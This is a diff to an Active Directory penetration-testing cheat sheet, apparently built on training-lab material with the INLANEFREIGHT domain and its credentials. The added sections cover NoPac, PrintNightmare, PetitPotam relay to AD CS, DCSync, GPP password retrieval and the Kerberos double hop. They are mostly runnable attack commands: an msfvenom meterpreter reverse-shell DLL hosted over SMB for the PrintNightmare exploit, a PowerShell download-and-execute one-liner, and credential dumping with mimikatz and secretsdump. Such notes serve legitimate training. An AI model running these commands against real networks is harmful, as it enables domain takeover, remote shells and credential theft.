@@ -759,7 +759,7 @@ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.
 ```
 (AD CS NTLM Relay Attack (ESC8)) 
 # use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service ( relay NTLM authenticate and get file certificate .pfx ) 
-impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+impacket-ntlmrelayx -debug -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 
 # force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug
 python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
@@ -1440,9 +1440,9 @@ ConvertTo-SID
 # PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host.
 Get-DomainSPNTicket
 
-____________________________________________
+________________________________________________________________________________________
 (Domain/LDAP Functions)
-____________________________________________
+________________________________________________________________________________________
 
 # PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.
 Get-Domain
@@ -1474,18 +1474,18 @@ Get-DomainFileServer
 # PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.
 Get-DomainDFSShare
 
-____________________________________________
+________________________________________________________________________________________
 (GPO Functions)
-____________________________________________
+________________________________________________________________________________________
 
 # PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.
 Get-DomainGPO
 
 # PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.
 Get-DomainPolicy
-____________________________________________
+________________________________________________________________________________________
 (Computer Enumeration Functions)
-____________________________________________
+________________________________________________________________________________________
 
 # PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.
 Get-NetLocalGroup
@@ -1502,9 +1502,9 @@ Get-NetSession
 # PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.
 Test-AdminAccess
 
-____________________________________________
+________________________________________________________________________________________
 (Threaded 'Meta'-Functions)
-____________________________________________
+________________________________________________________________________________________
 
 # PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.
 Find-DomainUserLocation
@@ -1518,9 +1518,9 @@ Find-InterestingDomainShareFile
 # PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.
 Find-LocalAdminAccess
 
-____________________________________________
+________________________________________________________________________________________
 (Domain Trust Functions)
-____________________________________________
+________________________________________________________________________________________
 
 # PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.
 Get-DomainTrust
@@ -1548,9 +1548,9 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ```
 ##### Enumeration by Living Off the Land
 ```
-____________________________________________
+________________________________________________________________________________________
 (Basic Enumeration Commands)
-____________________________________________
+________________________________________________________________________________________
 
 # Prints the PC's Name
 hostname
@@ -1576,9 +1576,9 @@ echo %USERDOMAIN%
 # Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
 echo %logonserver%
 
-____________________________________________
+________________________________________________________________________________________
 (Harnessing PowerShell)
-____________________________________________
+________________________________________________________________________________________
 
 # Lists available modules loaded for use.
 Get-Module
@@ -1598,9 +1598,9 @@ Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_his
 # This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
 
-____________________________________________
+________________________________________________________________________________________
 (Downgrade Powershell)
-____________________________________________
+________________________________________________________________________________________
 
 # Check your current PowerShell version and host information.
 Get-host
@@ -1608,9 +1608,9 @@ Get-host
 # Revert your PowerShell session to version 2.0 (Downgrade Attack).
 powershell.exe -version 2
 
-____________________________________________
+________________________________________________________________________________________
 (Checking Defenses)
-____________________________________________
+________________________________________________________________________________________
 
 # Display the Windows Firewall status across all profiles.
 netsh advfirewall show allprofiles
@@ -1629,9 +1629,9 @@ Get-MpComputerStatus
 # This command displays a list of all currently active login (sessions) on the Windows system.
 qwinsta
 
-____________________________________________
+________________________________________________________________________________________
 (Network Information)
-____________________________________________
+________________________________________________________________________________________
 
 # Lists all known hosts stored in the arp table.
 arp -a
@@ -1645,10 +1645,10 @@ route print
 # 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
 netsh advfirewall show allprofiles
 
-____________________________________________
+________________________________________________________________________________________
 (Windows Management Instrumentation (WMI))
 (https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
-____________________________________________
+________________________________________________________________________________________
 
 # Prints the patch level and description of the Hotfixes applied
 wmic qfe get Caption,Description,HotFixID,InstalledOn
@@ -1671,9 +1671,9 @@ wmic group list /format:list
 # Dumps information about any system accounts that are being used as service accounts.
 wmic sysaccount list /format:list
 
-____________________________________________
+________________________________________________________________________________________
 (Net Commands)
-____________________________________________
+________________________________________________________________________________________
 
 # Display domain password & lockout policy
 net accounts /domain
@@ -1717,9 +1717,9 @@ net view \\<computername> /all
 # Mount a network share to a local drive letter
 net use x: \\<computername>\<sharename>
 
-____________________________________________
+________________________________________________________________________________________
 (Dsquery Commands)
-____________________________________________
+________________________________________________________________________________________
 
 # List all users in the current domain (DN format)
 dsquery user
@@ -1742,9 +1742,9 @@ dsquery user -inactive 4
 # Find disabled user accounts
 dsquery user -disabled
 
-____________________________________________
+________________________________________________________________________________________
 (LDAP OID Matching Rules)
-____________________________________________
+________________________________________________________________________________________
 
 # 1.2.840.113556.1.4.803 (LDAP_MATCHING_RULE_BIT_AND)
 # Meaning: Bitwise AND. Matches if the bit is EXACTLY set.
@@ -1758,9 +1758,9 @@ ____________________________________________
 # Meaning: Recursive lookups. Walks the lineage of an object.
 # Use Case: Find all members of a group, including those in Nested Groups.
 
-____________________________________________
+________________________________________________________________________________________
 # (UAC Bitmask Cheat Sheet)
-____________________________________________
+________________________________________________________________________________________
 
 # 2     : Account disabled
 # 32    : Password not required (Critical vulnerability!)
@@ -1776,21 +1776,17 @@ dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=32)"
 ```
 ##### Kerberoasting 
 ```
-____________________________________________
+________________________________________________________________________________________
 (Kerberoasting Prerequisites)
-____________________________________________
+________________________________________________________________________________________
 
 # 1. Identity: Must have a valid Domain Identity (User/Pass, Hash, or active Shell).
 # 2. Scope: Any domain user can request a ticket for any SPN (even low-privilege users).
 # 3. Target: Must identify the Domain Controller (DC) IP to send LDAP/Kerberos queries.
 # 4. Tooling: Impacket (GetUserSPNs.py) for Linux or Rubeus/PowerView for Windows.
 
-____________________________________________
-(From Linux)
-____________________________________________
-
 ============================================
-(Kerberoasting automate with impacket)  (using https://github.com/fortra/impacket)
+(Kerberoasting automate with impacket from Linux)  (using https://github.com/fortra/impacket)
 ============================================
 
 # Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.
@@ -1809,12 +1805,8 @@ impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-us
 # Attempts to crack the Kerberos (-m 13100) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host.
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
 
-____________________________________________
-(From Windows) 
-____________________________________________
-
 ============================================
-(Kerberoasting manual with setspn.exe and mimikatz)
+(Kerberoasting manual with setspn.exe and mimikatz from windows)
 ============================================
 
 # Used to enumerate SPNs in a target Windows domain from a Windows-based host.
@@ -1943,33 +1935,250 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname 
 Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
 
 # PowerShell cmd-let used to covert an SDDL string into a readable format. Performed from a Windows-based host.
-ConvertFrom-SddlString "<Chuỗi SDDL>" | select -ExpandProperty DiscretionaryAcl
-```
+ConvertFrom-SddlString "<Strings SDDL>" | select -ExpandProperty DiscretionaryAcl
 
+```
 ##### DCSync Attack
 ```
 # PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
 Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl
 
+# Switch the context to the account with permissions.
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+
 # Uses Mimikatz to perform a dcsync attack from a Windows-based host.
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 
+```
+##### Privileged Access
+```
+# PowerView based tool to used to enumerate the Remote Desktop Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
 
 # Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
+$password = ConvertTo-SecureString 'Pr0xy_ILFREIGHT!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\proxyagent', $password)
 Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
 
+# Enumerating MSSQL Instances with PowerUpSQL  (https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+
+# PowerUpSQL tool used to connect to connect to a SQL server and query the version (-query 'Select @@version') from a Windows-based host.
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+# Impacket tool used to connect to a MSSQL server from a Linux-based host.
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+```
+##### Kerberos "Double Hop" Problem
+```
+# --- [ ERROR STATE IDENTIFICATION ] ---
+# When connected via standard WinRM (Network Logon), check for cached tickets:
+# In this state, you lack a TGT (Ticket Granting Ticket) to access network resources.
+klist 
+# Symptom: Only a service ticket (TGS) for the current host (HTTP/...) is visible.
+# Look for the 'S4U' (Service for User) flag, which indicates a restricted session.
+
+
+# --- [ WORKAROUND 1: PSCREDENTIAL OBJECT ] ---
+# (Recommended for CLI-only environments like Evil-WinRM, Linux, or Windows)
+# This method manually injects credentials into the command to initiate a new authentication flow.
+
+# Step 1: Securely store the cleartext password in memory.
+$pass = ConvertTo-SecureString 'Your_Password_Here' -AsPlainText -Force
+
+# Step 2: Create a PSCredential object containing the domain user and secure password.
+$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\User', $pass)
+
+# Step 3: Force the command to use these credentials to authenticate the "Second Hop."
+# Example: Querying the Domain Controller (DC) for SPN accounts.
+Get-DomainUser -spn -Credential $cred
+
+
+# --- [ WORKAROUND 2: PSSESSION CONFIGURATION ] ---
+# (Requires Local Admin rights and must be run from a Windows PowerShell Console)
+# This method creates a custom endpoint that impersonates the target user with full tokens.
+
+# Step 1: Register a new session configuration (Note: A GUI popup will appear for credentials).
+Register-PSSessionConfiguration -Name "CustomAdminShell" -RunAsCredential "DOMAIN\User"
+
+# Step 2: Restart the WinRM service to apply the configuration change.
+# Caution: This will temporarily disconnect existing WinRM sessions.
+Restart-Service WinRM
+
+# Step 3: Establish a new session from your attack host using the custom endpoint.
+Enter-PSSession -ComputerName TargetHost -ConfigurationName "CustomAdminShell"
+
+# Step 4: Verification - Verify you now possess a PRIMARY TGT (krbtgt/...).
+klist 
+
+
+# --- [ HOUSEKEEPING / CLEANUP ] ---
+# Always revert system modifications to remain stealthy and avoid leaving backdoors.
+Unregister-PSSessionConfiguration -Name "CustomAdminShell"
+```
+##### Bleeding Edge Vulnerabilities
+```
+________________________________________________________________________________________
+NoPac (SamAccountName Spoofing)
+________________________________________________________________________________________
+(NoPac Prerequisites)
+
+# 1. Identity: Valid Domain User credentials (standard user).
+# 2. Quota: ms-DS-MachineAccountQuota must be > 0 (Default is 10).
+# 3. Target: Vulnerable Domain Controller (Missing patches from Nov 2021).
+# 4. Tooling: noPac repo (scanner.py, noPac.py) and Impacket.
+
+============================================
+(NoPac automate with noPac.py From Linux) (using https://github.com/Ridter/noPac)
+============================================
+
+# Used to clone the impacket and noPac exploit repository to the attack host.
+git clone https://github.com/SecureAuthCorp/impacket.git
+python setup.py install 
+git clone https://github.com/Ridter/noPac.git
+
+# Runs scanner.py to check if the target DC is vulnerable (Checks ms-DS-MachineAccountQuota and TGT request).
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+
+# Executes the exploit to impersonate a Domain Admin and drop into a semi-interactive SYSTEM shell.
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+# Executes the exploit and performs a DCSync to dump the NTLM hash of the built-in Administrator.
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+
+________________________________________________________________________________________
+PrintNightmare (RCE)
+________________________________________________________________________________________
+(PrintNightmare Prerequisites)
+
+# 1. Identity: Valid Domain User credentials.
+# 2. Service: Print Spooler service (spoolsv.exe) must be running on target.
+# 3. Access: RPC protocols MS-RPRN or MS-PAR must be exposed over port 445/135.
+# 4. Tooling: CVE-2021-1675.py, MSFVenom for payload, and smbserver.py.
+
+============================================
+(PrintNightmare exploitation From Linux) (using https://github.com/cube0x0/CVE-2021-1675)
+============================================
+
+# Used to clone the cube0x0's Version of Impacket and PrintNightmare exploit repository to the attack host.
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+
+# Used to check for MS-RPRN or MS-PAR protocols on the target via RPC dump.
+rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+
+# Used to generate a malicious DLL payload for the reverse shell.
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+
+# Used to host the DLL payload on a local SMB share to be downloaded by the target DC.
+sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+
+# Executes the RCE exploit by pointing the target DC to the hosted DLL on our SMB share.
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+
+________________________________________________________________________________________
+PetitPotam (AD CS Relay)
+________________________________________________________________________________________
+(PetitPotam Prerequisites)
+
+# 1. Identity: No authentication required for the initial trigger (Coerced Auth).
+# 2. Target: Active Directory Certificate Services (AD CS) with Web Enrollment enabled.
+# 3. Network: NTLM Relay must be possible from DC to the CA host.
+# 4. Tooling: ntlmrelayx.py, PetitPotam.py, PKINITtools.
+
+============================================
+(PetitPotam & NTLM Relay to AD CS From Linux) (using https://github.com/topotam/PetitPotam)
+============================================
+
+# Step 1: Start ntlmrelayx.py to listen for DC authentication and relay to AD CS for a certificate.
+sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+
+# Step 2: Run PetitPotam to coerce the Domain Controller(172.16.5.5) to authenticate back to our attack host(172.16.5.255).
+python3 PetitPotam.py 172.16.5.225 172.16.5.5
+
+# Step 3: Use the captured Base64 certificate to request a TGT for the Domain Controller.
+python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <Base64_Cert> dc01.ccache
+
+# Step 4: Setting the KRB5CCNAME Environment Variable and Running klist to check ticket
+export KRB5CCNAME=dc01.ccache
+klist
+
+# Step 5: Using Domain Controller TGT to DCSync
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+or
+
+# Step 4: Extract the NT Hash from the captured TGT for long-term persistence.Submitting a TGS Request for Ourselves Using getnthash.py
+python /opt/PKINITtools/getnthash.py -key <AS-REP_Key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
+
+# Step 5: Using Domain Controller NTLM Hash to DCSync
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes :<NT_Hash>
+
+============================================
+(Requesting TGT and Performing PTT with DC01$ Machine Account From Windows) (using Rubeus)
+============================================
+
+# Using Rubeus to request a TGT and perform Pass-the-Ticket (PTT) with the Base64 certificate.
+.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<Base64_Cert> /ptt
+
+# Running klist to check ticket
+klist
+
+# Using Mimikatz to perform DCSync after the ticket has been injected into the session.
+lsadump::dcsync /user:inlanefreight\krbtgt
 ```
 ##### Miscellanous Configurations
 ```
-# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
+________________________________________________________________________________________
+Enumerating for MS-PRN Printer Bug (https://github.com/itzvenom/Security-Assessment-PS) 
+________________________________________________________________________________________
+# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host. 
 Import-Module .\SecurityAssessment.ps1
 Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 
-# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
-Get-DomainUser * | Select-Object samaccountname,description
+________________________________________________________________________________________
+Enumerating DNS Records (https://github.com/dirkjanm/adidnsdump) 
+________________________________________________________________________________________
+# Used to resolve all records in a DNS zone over LDAP from a Linux-based host.
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
 
+# Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host.
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+
+________________________________________________________________________________________
+Password in Description Field
+________________________________________________________________________________________
+# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
+Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+
+________________________________________________________________________________________
+Password in Description Field
+________________________________________________________________________________________
 # PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
 Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+________________________________________________________________________________________
+Credentials in SMB Shares and SYSVOL Scripts
+________________________________________________________________________________________
+# Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.
+ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+________________________________________________________________________________________
+Group Policy Preferences (GPP) Passwords
+________________________________________________________________________________________
+# Locating & Retrieving GPP Passwords with CrackMapExec
+crackmapexec smb -L | grep gpp
+
+# Using CrackMapExec's gpp_autologin Module
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin in file file Registry.xml
+
+# Using CrackMapExec's gpp_password Module  Retrieving GPP Passwords in file xml
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
+
 ```
 ##### ASREPRoasting
 ```
@@ -1984,8 +2193,28 @@ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 
 # Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
-```
 
+# Hunting for Users with Kerberos Pre-auth Not Required
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
+
+```
+##### Group Policy Object (GPO) Abuse 
+```
+________________________________________________________________________________________
+(https://github.com/FSecureLABS/SharpGPOAbuse)
+________________________________________________________________________________________
+# Enumerating GPO Names with PowerView
+Get-DomainGPO |select displayname
+
+# Enumerating GPO Names with a Built-In Cmdlet
+Get-GPO -All | Select DisplayName
+
+# Enumerating Domain User GPO Rights
+$sid=Convert-NameToSid "Domain Users" Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+
+# Converting GPO GUID to Name
+Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+```
 ##### Trust Relationships Child Parent Trusts
 ```
 # PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
@@ -2171,6 +2400,12 @@ netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
 
 # using module (-M) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M spider_plus --share Dev-share
+
+# Using  gpp_autologin Module retrieve Cleartext password in  file Registry.xml
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin 
+
+# Using  gpp_password Module  Retrieving GPP Passwords in file xml contain  cpassword
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
 
 # AS-REP Roasting ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack ) 
 netexec ldap dc01.fluffy.htb -u '' -p '' --asreproast output.txt
